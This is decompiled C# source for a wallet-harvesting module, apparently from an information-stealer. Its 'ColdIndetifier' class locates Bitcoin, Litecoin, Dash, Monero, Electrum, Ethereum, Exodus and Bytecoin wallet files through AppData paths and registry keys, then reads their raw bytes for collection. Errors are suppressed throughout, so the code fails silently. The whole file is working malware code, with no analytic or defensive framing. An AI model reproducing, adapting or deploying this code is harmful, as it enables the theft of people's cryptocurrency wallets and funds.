using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x0200018E RID: 398
	public class ColdIndetifier : GH9kf<ColdWallet>
	{
		// Token: 0x06000CA7 RID: 3239 RVA: 0x00027120 File Offset: 0x00025320
		public List<ColdWallet> EnumerateData()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				ColdWallet coldWallet = this.LTC();
				ColdWallet coldWallet2 = this.BQT();
				ColdWallet coldWallet3 = this.BTC();
				ColdWallet coldWallet4 = this.DQT();
				ColdWallet coldWallet5 = this.LTCQT();
				ColdWallet coldWallet6 = this.MNT();
				if (coldWallet != null)
				{
					list.Add(coldWallet);
				}
				if (coldWallet2 != null)
				{
					list.Add(coldWallet2);
				}
				if (coldWallet3 != null)
				{
					list.Add(coldWallet3);
				}
				if (coldWallet4 != null)
				{
					list.Add(coldWallet4);
				}
				if (coldWallet5 != null)
				{
					list.Add(coldWallet5);
				}
				if (coldWallet6 != null)
				{
					list.Add(coldWallet6);
				}
				foreach (ColdWallet coldWallet7 in (this.BYT() ?? new List<ColdWallet>()))
				{
					if (coldWallet7 != null)
					{
						list.Add(coldWallet7);
					}
				}
				foreach (ColdWallet coldWallet8 in (this.ELECT() ?? new List<ColdWallet>()))
				{
					if (coldWallet8 != null)
					{
						list.Add(coldWallet8);
					}
				}
				foreach (ColdWallet coldWallet9 in (this.ETH() ?? new List<ColdWallet>()))
				{
					if (coldWallet9 != null)
					{
						list.Add(coldWallet9);
					}
				}
				foreach (ColdWallet coldWallet10 in (this.EXDS() ?? new List<ColdWallet>()))
				{
					if (coldWallet10 != null)
					{
						list.Add(coldWallet10);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CA8 RID: 3240 RVA: 0x0002733C File Offset: 0x0002553C
		private ColdWallet LTC()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Litecoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Litecoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000CA9 RID: 3241 RVA: 0x000273AC File Offset: 0x000255AC
		private ColdWallet BQT()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software");
				RegistryKey registryKey2;
				if (registryKey == null)
				{
					registryKey2 = null;
				}
				else
				{
					RegistryKey registryKey3 = registryKey.OpenSubKey("Bitcoin");
					registryKey2 = ((registryKey3 != null) ? registryKey3.OpenSubKey("Bitcoin-Qt") : null);
				}
				using (RegistryKey registryKey4 = registryKey2)
				{
					string path = ((registryKey4 != null) ? registryKey4.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Bitcoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000CAA RID: 3242 RVA: 0x00027474 File Offset: 0x00025674
		private ColdWallet BTC()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Bitcoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Bitcoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000CAB RID: 3243 RVA: 0x000274E4 File Offset: 0x000256E4
		private List<ColdWallet> BYT()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Extension.Equals(".wallet"))
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Bytecoin"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CAC RID: 3244 RVA: 0x00027598 File Offset: 0x00025798
		private List<ColdWallet> EXDS()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								Name = fileInfo.Name,
								WalletName = "Exodus"
							});
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CAD RID: 3245 RVA: 0x00027638 File Offset: 0x00025838
		private ColdWallet DQT()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("Dash");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("Dash-Qt") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					string path = ((registryKey4 != null) ? registryKey4.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Dash-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000CAE RID: 3246 RVA: 0x00027708 File Offset: 0x00025908
		private List<ColdWallet> ELECT()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Electrum"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CAF RID: 3247 RVA: 0x000277B0 File Offset: 0x000259B0
		private List<ColdWallet> ETH()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Ethereum"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000CB0 RID: 3248 RVA: 0x00027858 File Offset: 0x00025A58
		private ColdWallet LTCQT()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("Litecoin");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("Litecoin-Qt") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					string path = ((registryKey4 != null) ? registryKey4.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Litecoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000CB1 RID: 3249 RVA: 0x00027928 File Offset: 0x00025B28
		private ColdWallet MNT()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("monero-project");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("monero-core") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					char[] separator = new char[]
					{
						'\\'
					};
					string text = (registryKey4 != null) ? registryKey4.GetValue("wallet_path").ToString().Replace("/", "\\") : null;
					if (File.Exists(text))
					{
						byte[] array = File.ReadAllBytes(text);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Monero",
								Name = text.Split(separator)[text.Split(separator).Length - 1]
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}
	}
}
